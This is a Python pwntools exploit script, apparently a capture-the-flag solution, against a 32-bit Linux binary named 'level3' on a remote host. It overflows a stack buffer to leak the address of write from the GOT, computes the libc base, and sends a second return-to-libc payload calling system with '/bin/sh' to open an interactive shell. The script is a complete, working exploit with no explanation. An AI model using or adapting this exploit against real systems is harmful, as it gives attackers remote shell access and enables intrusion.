from pwn import *

context(arch="i386", os="linux", log_level="debug")

# p = process("./level3")
p = remote("111.198.29.45", 34557)

elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.sym["main"]

p.recvuntil(":\n")
payload1 = "a" * 0x8c + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.sendline(payload1)

write_addr = u32(p.recv(4))

libc_base = write_addr - libc.sym["write"]
system_addr = libc_base + libc.sym["system"]

str_binsh = libc_base + 0x0015902b
print(hex(libc_base))

p.recvuntil(":\n")

payload2 = "a" * 0x8c + p32(system_addr) + p32(0xdeadbeef) + p32(str_binsh)
p.sendline(payload2)

p.interactive()